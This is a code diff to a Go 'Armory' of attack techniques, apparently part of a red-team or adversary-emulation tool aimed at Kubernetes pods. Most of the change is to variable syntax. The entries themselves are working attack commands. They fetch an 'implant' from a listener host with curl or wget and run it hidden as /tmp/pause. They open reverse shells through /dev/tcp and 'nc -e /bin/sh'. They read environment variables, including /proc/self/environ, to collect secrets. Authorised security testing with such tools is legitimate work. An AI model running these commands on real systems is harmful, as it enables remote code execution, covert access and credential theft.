@@ -105,8 +105,8 @@ func LoadArmory(dir string) (Armory, error) {
 			// Cmd:         "sh -c 'wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause'",
 			// Cmd: "sh -c \"wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause && chmod +x /tmp/pause && /tmp/pause &\"",
 			CmdVariants: []domain.CmdVariant{
-				{Key: "curl", Command: `sh -c "curl -L $LISTENER:$FILESHARE_PORT/implant -o /tmp/pause && chmod +x /tmp/pause && /tmp/pause &"`},
-				{Key: "wget", Command: `sh -c "wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause && chmod +x /tmp/pause && /tmp/pause &"`},
+				{Key: "curl", Command: `sh -c "curl -L ${LISTENER}:${FILESHARE_PORT}/implant -o /tmp/pause && chmod +x /tmp/pause && /tmp/pause &"`},
+				{Key: "wget", Command: `sh -c "wget ${LISTENER}:${FILESHARE_PORT}/implant -O /tmp/pause && chmod +x /tmp/pause && /tmp/pause &"`},
 			},
 			Requires: domain.Requirements{AccessLevel: domain.UserExec},
 		},
@@ -127,8 +127,9 @@ func LoadArmory(dir string) (Armory, error) {
 			Name:     "Install kubectl",
 			Tactics:  []domain.Tactic{domain.Discovery},
 			Requires: domain.Requirements{Kind: "Pod", AccessLevel: domain.UserExec},
+			Args:     map[string]string{"PATH": "~/.local/bin/kubectl"},
 			CmdVariants: []domain.CmdVariant{
-				{Key: "curl", Command: `curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl" && chmod +x kubectl && mkdir -p ~/.local/bin && mv ./kubectl ~/.local/bin/kubectl`},
+				{Key: "curl", Command: `bash -c "curl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\" && chmod +x kubectl && mkdir -p ~/.local/bin && mv ./kubectl ${PATH}"`},
 			},
 		},
 
@@ -159,17 +160,20 @@ func LoadArmory(dir string) (Armory, error) {
 			Description: "Establish a simple shell",
 			Tactics:     []domain.Tactic{domain.Execution},
 			CmdVariants: []domain.CmdVariant{
-				{Key: "shell", Command: `bash -c "bash >& /dev/tcp/$LISTENER/$LISTENER_PORT 0>&1 &"`},
-				{Key: "nc", Command: `bash -c "nc "$LISTENER $LISTENER_PORT -e /bin/sh &"`},
+				{Key: "shell", Command: `bash -c "bash >& /dev/tcp/$LISTENER/${LISTENER_PORT} 0>&1 &"`},
+				{Key: "nc", Command: `bash -c "nc "${LISTENER} ${LISTENER_PORT} -e /bin/sh &"`},
 			},
 			Requires: domain.Requirements{Infra: []string{"Listener"}, AccessLevel: domain.UserExec},
 		},
 		{
-			Name:          "Read Environment Variables",
-			Description:   "Read environment variables from a target",
-			Tactics:       []domain.Tactic{domain.Discovery},
-			Requires:      domain.Requirements{AccessLevel: domain.UserRead},
-			Cmd:           "env",
+			Name:        "Read Environment Variables",
+			Description: "Read environment variables from a target",
+			Tactics:     []domain.Tactic{domain.Discovery},
+			Requires:    domain.Requirements{AccessLevel: domain.UserRead},
+			CmdVariants: []domain.CmdVariant{
+				{Key: "shell", Command: `env`},
+				{Key: "cat", Command: `cat /proc/self/environ`},
+			},
 			ResultHandler: handleEnvVarResult,
 		},
 	}
